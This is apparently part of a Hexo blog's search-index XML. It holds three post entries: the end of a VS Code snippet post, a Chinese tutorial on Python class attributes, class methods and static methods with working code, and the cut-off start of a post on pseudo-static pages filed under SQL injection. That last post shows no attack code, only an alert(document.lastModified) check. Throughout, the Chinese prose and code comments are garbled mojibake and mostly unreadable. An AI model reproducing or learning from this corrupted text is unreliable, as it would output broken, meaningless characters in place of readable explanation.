class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;   - $2&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;description: $3&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;categories:&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;   - $4&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;date: $CURRENT_YEAR-$CURRENT_MONTH-$CURRENT_DATE $CURRENT_HOUR:$CURRENT_MINUTE:$CURRENT_SECOND&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;---\n&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;snippet fot hexo yaml&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre><p>```</p></li><li><p>æµ‹è¯•</p><p>åœ¨ markdown çš„ <code>.md</code> åç¼€æ–‡ä»¶ä¸­è¾“å…¥ <code>hexoy</code>ï¼Œå¹¶æŒ‰å›è½¦æˆ–è€… Tab é”®ï¼Œå³å¯è‡ªåŠ¨æ›¿æ¢ä¸º snippetã€‚</p></li></ol><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://code.visualstudio.com/docs/editor/userdefinedsnippets">Snippetsin Visual Studio Code</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python class</title>
      <link href="/blog/2020/03/10/programming/python/2.object-oriented/properties_methods/"/>
      <url>/blog/2020/03/10/programming/python/2.object-oriented/properties_methods/</url>
      
        <content type="html"><![CDATA[<h2 id="ç±»çš„ç»“æ„">ç±»çš„ç»“æ„</h2><h3 id="æœ¯è¯­-å®ä¾‹">æœ¯è¯­ â€”â€” å®ä¾‹</h3><ol type="1"><li>ä½¿ç”¨é¢å‘å¯¹è±¡å¼€å‘ï¼Œ<strong>ç¬¬ 1 æ­¥</strong> æ˜¯è®¾è®¡<strong>ç±»</strong></li><li>ä½¿ç”¨<code>ç±»å()</code> åˆ›å»ºå¯¹è±¡ï¼Œåˆ›å»ºå¯¹è±¡çš„åŠ¨ä½œæœ‰ä¸¤æ­¥:<ol type="1"><li>åœ¨å†…å­˜ä¸­ä¸ºå¯¹è±¡ <strong>åˆ†é…ç©ºé—´</strong></li><li>è°ƒç”¨åˆå§‹åŒ–æ–¹æ³• <code>__init__</code> ä¸º<strong>å¯¹è±¡åˆå§‹åŒ–</strong></li></ol></li><li>å¯¹è±¡åˆ›å»ºåï¼Œ<strong>å†…å­˜</strong> ä¸­å°±æœ‰äº†ä¸€ä¸ªå¯¹è±¡çš„<strong>å®å®åœ¨åœ¨</strong> çš„å­˜åœ¨ â€”â€” <strong>å®ä¾‹</strong></li></ol><p>å› æ­¤ï¼Œé€šå¸¸ä¹Ÿä¼šæŠŠï¼š</p><ol type="1"><li>åˆ›å»ºå‡ºæ¥çš„ <strong>å¯¹è±¡</strong> å«åš <strong>ç±»</strong> çš„<strong>å®ä¾‹</strong></li><li>åˆ›å»ºå¯¹è±¡çš„ <strong>åŠ¨ä½œ</strong> å«åš <strong>å®ä¾‹åŒ–</strong></li><li><strong>å¯¹è±¡çš„å±æ€§</strong> å«åš <strong>å®ä¾‹å±æ€§</strong></li><li><strong>å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•</strong> å«åš <strong>å®ä¾‹æ–¹æ³•</strong></li></ol><p>åœ¨ç¨‹åºæ‰§è¡Œæ—¶ï¼š</p><ol type="1"><li>å¯¹è±¡å„è‡ªæ‹¥æœ‰è‡ªå·±çš„ <strong>å®ä¾‹å±æ€§</strong></li><li>è°ƒç”¨å¯¹è±¡æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡ <code>self</code><ul><li>è®¿é—®è‡ªå·±çš„å±æ€§</li><li>è°ƒç”¨è‡ªå·±çš„æ–¹æ³•</li></ul></li></ol><p><strong>ç»“è®º</strong></p><ul><li><strong>æ¯ä¸€ä¸ªå¯¹è±¡</strong> éƒ½æœ‰è‡ªå·±<strong>ç‹¬ç«‹çš„å†…å­˜ç©ºé—´</strong>ï¼Œ<strong>ä¿å­˜å„è‡ªä¸åŒçš„å±æ€§</strong></li><li><strong>å¤šä¸ªå¯¹è±¡çš„æ–¹æ³•</strong>ï¼Œ<strong>åœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä»½</strong>ï¼Œåœ¨è°ƒç”¨æ–¹æ³•æ—¶ï¼Œ<strong>éœ€è¦æŠŠå¯¹è±¡çš„å¼•ç”¨</strong>ä¼ é€’åˆ°æ–¹æ³•å†…éƒ¨</li></ul><h3 id="ç±»æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡">ç±»æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡</h3><blockquote><p><code>Python</code> ä¸­ <strong>ä¸€åˆ‡çš†å¯¹è±¡</strong>ï¼š</p><ul><li><code>class AAA:</code> å®šä¹‰çš„ç±»å±äº <strong>ç±»å¯¹è±¡</strong></li><li><code>obj1 = AAA()</code> å±äº <strong>å®ä¾‹å¯¹è±¡</strong></li></ul></blockquote><ul><li>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œ<strong>ç±»</strong> åŒæ ·<strong>ä¼šè¢«åŠ è½½åˆ°å†…å­˜</strong></li><li>åœ¨ <code>Python</code> ä¸­ï¼Œ<strong>ç±»</strong> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ â€”â€”<strong>ç±»å¯¹è±¡</strong></li><li>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œ<strong>ç±»å¯¹è±¡</strong> åœ¨å†…å­˜ä¸­<strong>åªæœ‰ä¸€ä»½</strong>ï¼Œä½¿ç”¨ <strong>ä¸€ä¸ªç±»</strong> å¯ä»¥åˆ›å»ºå‡º<strong>å¾ˆå¤šä¸ªå¯¹è±¡å®ä¾‹</strong></li><li>é™¤äº†å°è£…<strong>å®ä¾‹</strong>çš„<strong>å±æ€§</strong>å’Œ<strong>æ–¹æ³•</strong>å¤–ï¼Œ<strong>ç±»å¯¹è±¡</strong>è¿˜å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„<strong>å±æ€§</strong>å’Œ<strong>æ–¹æ³•</strong><ol type="1"><li><strong>ç±»å±æ€§</strong></li><li><strong>ç±»æ–¹æ³•</strong></li></ol></li><li>æ— è®ºæ˜¯åœ¨å¯¹è±¡çš„æ–¹æ³•é‡Œé¢ï¼Œ è¿˜æ˜¯åœ¨ç±»å¤–é¢éƒ½é€šè¿‡ <strong>ç±»å.</strong>çš„æ–¹å¼å¯ä»¥ <strong>è®¿é—®ç±»çš„å±æ€§</strong> æˆ–è€…<strong>è°ƒç”¨ç±»çš„æ–¹æ³•</strong></li></ul><h2 id="ç±»å±æ€§å’Œå®ä¾‹å±æ€§">ç±»å±æ€§å’Œå®ä¾‹å±æ€§</h2><h3 id="æ¦‚å¿µå’Œä½¿ç”¨">æ¦‚å¿µå’Œä½¿ç”¨</h3><ul><li><strong>ç±»å±æ€§</strong> å°±æ˜¯ç»™ <strong>ç±»å¯¹è±¡</strong> ä¸­å®šä¹‰çš„<strong>å±æ€§</strong></li><li>é€šå¸¸ç”¨æ¥è®°å½• <strong>ä¸è¿™ä¸ªç±»ç›¸å…³</strong> çš„ç‰¹å¾</li><li><strong>ç±»å±æ€§</strong> <strong>ä¸ä¼šç”¨äº</strong>è®°å½•<strong>å…·ä½“å¯¹è±¡çš„ç‰¹å¾</strong></li></ul><p><strong>ç¤ºä¾‹éœ€æ±‚</strong></p><ul><li>å®šä¹‰ä¸€ä¸ª <strong>å·¥å…·ç±»</strong></li><li>æ¯ä»¶å·¥å…·éƒ½æœ‰è‡ªå·±çš„ <code>name</code></li><li><strong>éœ€æ±‚</strong> â€”â€” çŸ¥é“ä½¿ç”¨è¿™ä¸ªç±»ï¼Œåˆ›å»ºäº†å¤šå°‘ä¸ªå·¥å…·å¯¹è±¡</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tool</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># ä½¿ç”¨èµ‹å€¼è¯­å¥å®šä¹‰ç±»å±æ€§, è®°å½•åˆ›å»ºå·¥å…·å¯¹è±¡çš„æ€»æ•°</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">        <span class="comment"># é’ˆå¯¹äº†ç±»å±æ€§åšä¸€ä¸ªè®¡æ•° + 1</span></span><br><span class="line">        Tool.count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">tool1 = Tool(<span class="string">&#x27;æ–§å¤´&#x27;</span>)</span><br><span class="line">tool1 = Tool(<span class="string">&#x27;æ¦”å¤´&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># çŸ¥é“ä½¿ç”¨ Tool ç±»åˆ›å»ºäº†å¤šå°‘å¯¹è±¡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ç°åœ¨åˆ›å»ºäº† <span class="subst">&#123;Tool.count&#125;</span> ä¸ªå·¥å…·&#x27;</span>)</span><br></pre></td></tr></table></figure><p>noteï¼šPython ä¸­çš„ç±»å±æ€§ç±»ä¼¼äº C++ä¸­çš„é™æ€å±æ€§ï¼Œå±äºç±»ï¼Œä¸å±äºå¯¹è±¡ï¼Œä¸”åªæœ‰ä¸€ä»½</p><h3 id="å±æ€§çš„è·å–æœºåˆ¶ç§‘æ™®">2.2 å±æ€§çš„è·å–æœºåˆ¶ï¼ˆç§‘æ™®ï¼‰</h3><ul><li>åœ¨ <code>Python</code> ä¸­ <strong>å±æ€§çš„è·å–</strong> å­˜åœ¨ä¸€ä¸ª<strong>å‘ä¸ŠæŸ¥æ‰¾æœºåˆ¶</strong></li><li>å› æ­¤ï¼Œè¦è®¿é—®ç±»å±æ€§æœ‰ä¸¤ç§æ–¹å¼ï¼š<ol type="1"><li><strong>ç±»å.ç±»å±æ€§</strong></li><li><strong>å¯¹è±¡.ç±»å±æ€§</strong> ï¼ˆä¸æ¨èï¼‰</li></ol></li></ul><p><strong>æ³¨æ„</strong></p><ul><li>å¦‚æœä½¿ç”¨ <code>å¯¹è±¡.ç±»å±æ€§ = å€¼</code> èµ‹å€¼è¯­å¥ï¼Œåªä¼š<strong>ç»™å¯¹è±¡æ·»åŠ ä¸€ä¸ªå±æ€§</strong>ï¼Œè€Œä¸ä¼šå½±å“åˆ°<strong>ç±»å±æ€§çš„å€¼</strong></li></ul><h2 id="ç±»æ–¹æ³•å’Œé™æ€æ–¹æ³•">ç±»æ–¹æ³•å’Œé™æ€æ–¹æ³•</h2><h3 id="ç±»æ–¹æ³•">3.1 ç±»æ–¹æ³•</h3><ul><li>ç±»å±æ€§ å°±æ˜¯é’ˆå¯¹ <strong>ç±»å¯¹è±¡</strong> å®šä¹‰çš„å±æ€§<ul><li>ä½¿ç”¨ <strong>èµ‹å€¼è¯­å¥</strong> åœ¨ <code>class</code>å…³é”®å­—ä¸‹æ–¹å¯ä»¥å®šä¹‰ <strong>ç±»å±æ€§</strong></li><li><strong>ç±»å±æ€§</strong> ç”¨äºè®°å½• <strong>ä¸è¿™ä¸ªç±»ç›¸å…³</strong>çš„ç‰¹å¾</li></ul></li><li>ç±»æ–¹æ³• å°±æ˜¯é’ˆå¯¹ <strong>ç±»å¯¹è±¡</strong> å®šä¹‰çš„æ–¹æ³•<ul><li>åœ¨ <strong>ç±»æ–¹æ³•</strong> å†…éƒ¨å¯ä»¥ç›´æ¥è®¿é—® <strong>ç±»å±æ€§</strong>æˆ–è€…è°ƒç”¨å…¶ä»–çš„ <strong>ç±»æ–¹æ³•</strong></li></ul></li></ul><p><strong>è¯­æ³•å¦‚ä¸‹</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ç±»æ–¹æ³•å</span>(<span class="params">cls</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li>ç±»æ–¹æ³•éœ€è¦ç”¨ <strong>ä¿®é¥°å™¨</strong> <code>@classmethod</code>æ¥æ ‡è¯†ï¼Œ<strong>å‘Šè¯‰è§£é‡Šå™¨è¿™æ˜¯ä¸€ä¸ªç±»æ–¹æ³•</strong></li><li>ç±»æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯ <code>cls</code><ul><li>ç”± <strong>å“ªä¸€ä¸ªç±»</strong> è°ƒç”¨çš„æ–¹æ³•ï¼Œæ–¹æ³•å†…çš„ <code>cls</code>å°±æ˜¯ <strong>å“ªä¸€ä¸ªç±»çš„å¼•ç”¨</strong></li><li>è¿™ä¸ªå‚æ•°å’Œ <strong>å®ä¾‹æ–¹æ³•</strong> çš„ç¬¬ä¸€ä¸ªå‚æ•°: <code>self</code>ç±»ä¼¼</li><li><strong>æç¤º</strong> ä½¿ç”¨å…¶ä»–åç§°ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡ä¹ æƒ¯ä½¿ç”¨<code>cls</code></li></ul></li><li>é€šè¿‡ <strong>ç±»å.</strong> è°ƒç”¨<strong>ç±»æ–¹æ³•</strong>ï¼Œ<strong>è°ƒç”¨æ–¹æ³•æ—¶</strong>ï¼Œä¸éœ€è¦ä¼ é€’<code>cls</code> å‚æ•°</li><li>åœ¨æ–¹æ³•å†…éƒ¨<ul><li>å¯ä»¥é€šè¿‡ <code>cls.</code> <strong>è®¿é—®ç±»çš„å±æ€§</strong></li><li>ä¹Ÿå¯ä»¥é€šè¿‡ <code>cls.</code> <strong>è°ƒç”¨å…¶ä»–çš„ç±»æ–¹æ³•</strong></li></ul></li></ul><p><strong>ç¤ºä¾‹éœ€æ±‚</strong></p><ul><li>å®šä¹‰ä¸€ä¸ª <strong>å·¥å…·ç±»</strong></li><li>æ¯ä»¶å·¥å…·éƒ½æœ‰è‡ªå·±çš„ <code>name</code></li><li><strong>éœ€æ±‚</strong> â€”â€” åœ¨ <strong>ç±»</strong> å°è£…ä¸€ä¸ª<code>show_tool_count</code>çš„ç±»æ–¹æ³•ï¼Œè¾“å‡ºä½¿ç”¨å½“å‰è¿™ä¸ªç±»ï¼Œåˆ›å»ºçš„å¯¹è±¡ä¸ªæ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tool</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä½¿ç”¨èµ‹å€¼è¯­å¥å®šä¹‰ç±»å±æ€§, è®°å½•åˆ›å»ºå·¥å…·å¯¹è±¡çš„æ€»æ•°</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç±»å±æ€§ count ++ æ¥è®°å½•å¯¹è±¡çš„æ•°ç›®</span></span><br><span class="line">        Tool.count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">total_count</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">return</span> cls.count</span><br><span class="line"></span><br><span class="line">tool1 = Tool(<span class="string">&#x27;æ–§å¤´&#x27;</span>)</span><br><span class="line">tool1 = Tool(<span class="string">&#x27;æ¦”å¤´&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># çŸ¥é“ä½¿ç”¨ Tool ç±»åˆ›å»ºäº†å¤šå°‘å¯¹è±¡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ç°åœ¨åˆ›å»ºäº† <span class="subst">&#123;Tool.total_count()&#125;</span> ä¸ªå·¥å…·&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="é™æ€æ–¹æ³•">é™æ€æ–¹æ³•</h3><ul><li>åœ¨å¼€å‘æ—¶ï¼Œå¦‚æœéœ€è¦åœ¨ <strong>ç±»</strong> ä¸­å°è£…ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ï¼š<ul><li>æ—¢ <strong>ä¸éœ€è¦</strong> è®¿é—® <strong>å®ä¾‹å±æ€§</strong> æˆ–è€…è°ƒç”¨<strong>å®ä¾‹æ–¹æ³•</strong> â€”â€” å³ï¼šä¸æ˜¯å®ä¾‹æ–¹æ³•</li><li>ä¹Ÿ <strong>ä¸éœ€è¦</strong> è®¿é—® <strong>ç±»å±æ€§</strong> æˆ–è€…è°ƒç”¨<strong>ç±»æ–¹æ³•</strong> â€”â€” å³ï¼šä¸æ˜¯ç±»æ–¹æ³•</li></ul></li><li>è¿™ä¸ªæ—¶å€™ï¼Œå¯ä»¥æŠŠè¿™ä¸ªæ–¹æ³•å°è£…æˆä¸€ä¸ª <strong>é™æ€æ–¹æ³•</strong></li></ul><p><strong>è¯­æ³•å¦‚ä¸‹</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">é™æ€æ–¹æ³•å</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li><strong>é™æ€æ–¹æ³•</strong> éœ€è¦ç”¨ <strong>ä¿®é¥°å™¨</strong><code>@staticmethod</code>æ¥æ ‡è¯†ï¼Œ<strong>å‘Šè¯‰è§£é‡Šå™¨è¿™æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•</strong></li><li>é€šè¿‡ <strong>ç±»å.</strong> è°ƒç”¨ <strong>é™æ€æ–¹æ³•</strong>ï¼Œä¸éœ€è¦åˆ›å»ºå®ä¾‹</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç‹—å¯¹è±¡è®¡æ•°</span></span><br><span class="line">    dog_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä¸éœ€è¦è®¿é—®å®ä¾‹å±æ€§ä¹Ÿä¸éœ€è¦è®¿é—®ç±»å±æ€§çš„æ–¹æ³•</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç‹—åœ¨è·‘...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ç»¼åˆæ¡ˆä¾‹">3.3 æ–¹æ³•ç»¼åˆæ¡ˆä¾‹</h3><p><strong>éœ€æ±‚</strong></p><ol type="1"><li>è®¾è®¡ä¸€ä¸ª <code>Game</code> ç±»</li><li>å±æ€§ï¼š<ul><li>å®šä¹‰ä¸€ä¸ª <strong>ç±»å±æ€§</strong> <code>top_score</code> è®°å½•æ¸¸æˆçš„<strong>å†å²æœ€é«˜åˆ†</strong></li><li>å®šä¹‰ä¸€ä¸ª <strong>å®ä¾‹å±æ€§</strong> <code>player_name</code> è®°å½•<strong>å½“å‰æ¸¸æˆçš„ç©å®¶å§“å</strong></li></ul></li><li>æ–¹æ³•ï¼š<ul><li><strong>é™æ€æ–¹æ³•</strong> <code>show_help</code>æ˜¾ç¤ºæ¸¸æˆå¸®åŠ©ä¿¡æ¯</li><li><strong>ç±»æ–¹æ³•</strong> <code>show_top_score</code>æ˜¾ç¤ºå†å²æœ€é«˜åˆ†</li><li><strong>å®ä¾‹æ–¹æ³•</strong> <code>start_game</code>å¼€å§‹å½“å‰ç©å®¶çš„æ¸¸æˆ</li></ul></li><li>ä¸»ç¨‹åºæ­¥éª¤<ul><li><ol type="1"><li>æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</li></ol></li><li><ol start="2" type="1"><li>æŸ¥çœ‹å†å²æœ€é«˜åˆ†</li></ol></li><li><ol start="3" type="1"><li>åˆ›å»ºæ¸¸æˆå¯¹è±¡ï¼Œå¼€å§‹æ¸¸æˆ</li></ol></li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Game</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    top_score = <span class="number">521</span>  <span class="comment"># record the highest score ever</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.player_name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_game</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.player_name&#125;</span> start the game&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_help</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;there is some help information for you:\nbulabulabula...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_top_score</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;top score is <span class="subst">&#123;cls.top_score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Game.show_help()</span><br><span class="line">    Game.show_top_score()</span><br><span class="line">    xiaoming = Game(<span class="string">&#x27;xiaoming&#x27;</span>)</span><br><span class="line">    xiaoming.start_game()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>é™æ€æ–¹æ³•å’Œç±»æ–¹æ³•è°ƒç”¨çš„æ—¶å€™éƒ½æ˜¯ç›´æ¥ä½¿ç”¨<code>ç±»å.</code>æ¥è°ƒç”¨ï¼Œåªæœ‰å®ä¾‹æ–¹æ³•ä½¿ç”¨<code>å¯¹è±¡å.</code> è°ƒç”¨ã€‚</p><h2 id="å®ä¾‹æ–¹æ³•ç±»æ–¹æ³•é™æ€æ–¹æ³•">å®ä¾‹æ–¹æ³•ã€ç±»æ–¹æ³•ã€é™æ€æ–¹æ³•</h2><p>æ™®é€šå®ä¾‹æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æ˜¯ selfï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªå…·ä½“çš„å®ä¾‹æœ¬èº«ã€‚å¦‚æœç”¨äº† staticmethodï¼Œé‚£ä¹ˆå°±å¯ä»¥æ— è§†è¿™ä¸ªselfï¼Œè€Œå°†è¿™ä¸ªæ–¹æ³•å½“æˆä¸€ä¸ªæ™®é€šçš„å‡½æ•°ä½¿ç”¨ã€‚ è€Œå¯¹äºclassmethodï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸æ˜¯ selfï¼Œæ˜¯ clsï¼Œå®ƒè¡¨ç¤ºè¿™ä¸ªç±»æœ¬èº«ã€‚</p><p>æ¨èé˜…è¯»ï¼š <ahref="https://blog.csdn.net/lihao21/article/details/79762681">Pythonå®ä¾‹æ–¹æ³•ã€ç±»æ–¹æ³•å’Œé™æ€æ–¹æ³•</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¼ªé™æ€é™æ€æ³¨å…¥</title>
      <link href="/blog/2020/03/05/websec/sql_injection/pseudo_static_injection/"/>
      <url>/blog/2020/03/05/websec/sql_injection/pseudo_static_injection/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />æœªå®Œæˆ</label></li></ul><p>ä¼ªé™æ€ï¼šå±•ç¤ºå‡ºæ¥çš„æ˜¯ä»¥ html ä¸€ç±»çš„é™æ€é¡µé¢å½¢å¼ï¼Œä½†å…¶å®æ˜¯ç”¨ ASPä¸€ç±»çš„åŠ¨æ€è„šæœ¬æ¥å¤„ç†çš„ã€‚</p><p>é™æ€ï¼šæ ‡å‡†çš„ htmlæ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æ‰©å±•åæ˜¯.htmã€.htmlï¼Œå¯ä»¥åŒ…å«æ–‡æœ¬ã€å›¾åƒã€å£°éŸ³ã€FLASHåŠ¨ç”»ã€å®¢æˆ·ç«¯è„šæœ¬å’Œ ActiveX æ§ä»¶åŠ JAVA å°ç¨‹åºç­‰ã€‚</p><p><strong>å¦‚ä½•åŒºåˆ†ä¼ªé™æ€å’Œé™æ€</strong></p><p>1ã€Chrome æµè§ˆå™¨ã€Firefox æµè§ˆå™¨</p><p>æ‰“å¼€ç½‘é¡µï¼Œå¿«æ·é”® F12 æ‰“å¼€å¼€å‘è€…å·¥å…·-æ§åˆ¶å°ï¼Œè¾“å…¥alert(document.lastModified);ï¼ŒæŒ‰å›è½¦é”®ä¼šå‡ºç°ä¸€ä¸ªæ˜¾ç¤ºæ—¶é—´çš„å¼¹çª—ï¼Œå¤šæ¬¡åˆ·æ–°ç½‘é¡µï¼Œå†ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œæ¯”è¾ƒå¼¹çª—çš„æ—¶é—´ï¼Œå¦‚æœæ˜¾ç¤ºçš„éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯é™æ€ç½‘é¡µï¼Œå¦åˆ™å°±æ˜¯ä¼ªé™æ€ã€‚</p><p>2ã€IE æµè§ˆå™¨</p><p>æ‰“å¼€ç½‘é¡µï¼Œåœ¨åœ°å€æ é‡Œè¾“å…¥ javascript:alert(document.lastModified)ï¼ŒæŒ‰å›è½¦é”®ä¼šå‡ºç°ä¸€ä¸ªæ˜¾ç¤ºæ—¶é—´çš„å¼¹çª—ï¼Œå¤šæ¬¡åˆ·æ–°ç½‘é¡µï¼Œç”¨åŒæ ·çš„æ–¹æ³•ï¼Œæ¯”è¾ƒå¼¹çª—çš„æ—¶é—´ï¼Œå¦‚æœæ˜¾ç¤ºçš„éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯é™æ€ç½‘é¡µï¼Œå¦åˆ™å°±æ˜¯ä¼ªé™æ€ã€‚</p><p><strong>å¦‚ä½•é€‰æ‹©ä¼ªé™æ€å’Œé™æ€</strong></p><p>1ã€ä½¿ç”¨ä¼ªé™æ€å’Œé™æ€å¯¹ SEO 